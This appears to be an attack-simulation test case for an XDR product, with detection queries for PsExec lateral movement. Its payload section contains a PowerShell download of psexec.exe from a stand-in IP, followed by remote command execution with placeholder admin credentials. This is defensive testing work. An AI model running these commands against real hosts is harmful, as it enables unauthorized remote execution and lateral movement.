identity.name: PsExec Lateral Movement via Remote Service Creation
identity.summary: An attacker uses PsExec to create a remote service and execute a command on a target host. Cortex should detect the process execution and network connection associated with this behavior.
identity.description: An attacker uses PsExec to create a remote service and execute a command on a target host. Cortex should detect the process execution and network connection associated with this behavior.

payload.code:
powershell -Command "Invoke-WebRequest -Uri 'http://192.0.2.5/psexec.exe' -OutFile 'C:\\temp\\psexec.exe'"
C:\temp\psexec.exe \\TARGETHOST -u ADMINUSER -p PASSWORD -c -f cmd.exe /c "echo Hello > C:\\temp\\output.txt"

expected_artifacts.description: PsExec process execution on the source host

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: PsExec Remote Process Execution
biocs.description: Detection of PsExec process starting with remote service execution
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'psexec.exe'
| filter action_process_image_name = 'cmd.exe'
| filter action_remote_ip != null

abiocs.name: Attempt to execute a command on a remote host using PsExec
abiocs.description: Detection of PsExec creating a remote service and executing a command
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'psexec.exe'
| filter action_remote_ip = '192.0.2.10'
| filter action_process_image_name = 'cmd.exe'
abiocs.causality_anchor: PsExec process start with remote IP

xql_queries.name: PsExec Remote Execution Detection
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'psexec.exe'
| filter action_remote_ip != null
| filter action_process_image_name = 'cmd.exe'
| fields agent_hostname, actor_process_image_name, action_remote_ip, action_process_image_name
